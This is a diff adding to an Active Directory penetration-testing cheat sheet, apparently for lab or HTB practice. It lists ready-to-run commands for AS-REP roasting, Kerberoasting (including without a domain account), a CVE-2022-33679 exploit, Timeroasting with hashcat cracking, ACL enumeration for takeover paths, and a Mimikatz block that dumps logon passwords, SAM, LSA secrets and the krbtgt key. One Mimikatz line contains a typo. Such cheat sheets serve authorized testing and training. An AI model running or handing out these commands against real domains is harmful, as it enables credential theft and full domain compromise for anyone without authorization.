@@ -9,6 +9,7 @@ https://github.com/lkarlslund/Adalanche/releases
 ```bash
 nxc smb 192.168.32.0/24
 source /opt/setenv.sh ip domain dc # user pass
+
 sudo ntpdate -u $ip && date # (host) sudo service vboxadd-service stop -> sudo rdate -n $dcip, timedatectl set-ntp 0 (for troubleshooting)
 
 /opt/nmap.sh -H $ip -t All
@@ -129,9 +130,36 @@ for u in $(cat users.txt); do GetNPUsers.py -request -format hashcat -outputfile
 GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip "$dom/"
 GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip $dom/$user:$pass
 GetNPUsers.py $dom/ -dc-ip $ip -usersfile users.txt -format hashcat -outputfile hashes.txt
+GetNPUsers.py htb.local/svc-alfresco -no-pass
+bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
+PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
+Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast
+nxc ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
 
+# CVE-2022-33679 ( If you can't crack ASREP hash )
+bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
+PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
+user@hostname:~$ python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL
+user@hostname:~$ export KRB5CCNAME=/home/project/User.ccache
+user@hostname:~$ netexec smb DC01.DOMAIN.LOCAL -k --shares
+
+# Kerberoasting
 impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom/"
 impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom"/"$user":"$pass"
+nxc ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt
+Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local" # powerview
+Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt # Kerberoast (RC4 ticket)
+Rubeus.exe kerberoast /tgtdeleg # Kerberoast (AES ticket), Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.
+Rubeus.exe kerberoast /rc4opsec # Kerberoast (RC4 ticket), The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.
+
+# Kerberoasting without domain account
+# Prereqs: have a list of users, be able to query KDC
+GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/ 
+Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
+
+# Timeroasting
+sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
+hashcat -m 31300 ntp-hashes.txt
 
 /opt/windows/nxc.sh $ip
 
@@ -328,7 +356,8 @@ SPN-Jacking.py # If the "listed SPN" already belongs to an object, it must be re
 
 # Generic All / Generic Write / Owns - User (targeted kerberoast, reset password, targeted asreproast, alter script path)
 python /opt/windows/bloodyAD/bloodyAD.py --host $dc -d $dom -u $user -p $pass -k get writable --right WRITE --detail
-Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|') }
+Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner') }
+Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
 # Change their Password
 net user <username> <password> /domain
 # Change their password
@@ -718,6 +747,26 @@ cat docker-compose.yml | docker compose -f - up
 firefox http://localhost:8080/ui/login # Username: admin, Password: see your Docker logs
 # Custom Queries
 # https://github.com/ThePorgs/Exegol-images/blob/main/sources/assets/
+
+---
+
+# MimiKatz
+.\mimikatz.exe
+token::elevate # Makes sure commands are run as system
+token::elevate /domainadmin
+privilege::debug # Test if ^ is the case
+log
+sekurlsa::logonpasswords # Who has been on the host machine?
+kerberos::list /export
+kerberos::ptt ticket.kirbi # whoami will return your name pre-ptt, must test by access or executing something you couldn't before
+lsadump::lsa /inject
+sadump::lsa /inject /name:krbtgt
+kerberos::tgt
+sekurlsa::msv
+sekurlsa::ekeys
+lsadump::sam
+lsadump::secrets
+lsadump::cache
 
 ---
 
